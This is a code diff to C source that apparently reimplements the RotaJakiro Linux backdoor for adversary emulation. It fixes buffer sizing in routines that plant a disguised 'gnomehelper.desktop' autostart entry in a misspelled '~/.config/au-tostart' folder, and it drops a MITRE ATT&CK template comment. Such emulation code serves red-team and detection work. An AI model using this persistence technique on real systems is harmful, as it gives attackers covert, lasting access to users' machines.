@@ -9,23 +9,12 @@
 #include <sys/shm.h>
 #include <sys/wait.h>
 #include <pthread.h>
+#include <limits.h>
 
 // custom headers
 #include "persistence.h"
 #include "utils.h"
 
-
-// MyCoolFunction
-//      About:
-//          MyCoolFunction does cool things
-//      Result:
-//          Returns a string capturing all of my cool things
-//      MITRE ATT&CK Techniques:
-//          T1059.001 Command and Scripting Interpreter: Windows Command Shell
-//      CTI:
-//          https://link/to/CTI/report.pdf
-//      Other References:
-//          https://github.com/repo/that/helped/me/write/my/function
 
 bool copy_rota_to_userland(char *destpath) {
     struct stat procstru;
@@ -118,16 +107,16 @@ bool nonroot_desktop_persistence() {
     char *gnomehelper_path = "/.config/au-tostart/gnomehelper.desktop";
 
     int fpath_size = strlen(HOME) + strlen(gnomehelper_path);
-    char *fpath = (char *)malloc(fpath_size);
-    memset(fpath, 0, fpath_size);
+    char *fpath = (char *)malloc(PATH_MAX);
+    memset(fpath, 0, PATH_MAX);
     strncat(fpath, HOME, strlen(HOME));
     strncat(fpath, gnomehelper_path, strlen(gnomehelper_path));
 
     // create dir in home directory
     char *audir = "/.config/au-tostart";
     int dirpath_size = strlen(HOME) + strlen(audir);
-    char *dirpath = (char *)malloc(dirpath_size);
-    memset(dirpath, 0, dirpath_size);
+    char *dirpath = (char *)malloc(PATH_MAX);
+    memset(dirpath, 0, PATH_MAX);
 
     strncat(dirpath, HOME, strlen(HOME));
     strncat(dirpath, audir, strlen(audir));
@@ -266,7 +255,8 @@ bool nonroot_persistence(void) {
     char *desktop_path = "/.config/au-tostart/gnomehelper.desktop";
     int desktop_path_size = strlen(home) + strlen(desktop_path);
 
-    char *home_desktop_path = (char *)malloc(desktop_path_size);
+    char *home_desktop_path = (char *)malloc(PATH_MAX);
+		memset(home_desktop_path, 0, PATH_MAX);
     memcpy(home_desktop_path, home, strlen(home));
     strncat(home_desktop_path, desktop_path, strlen(desktop_path));
 
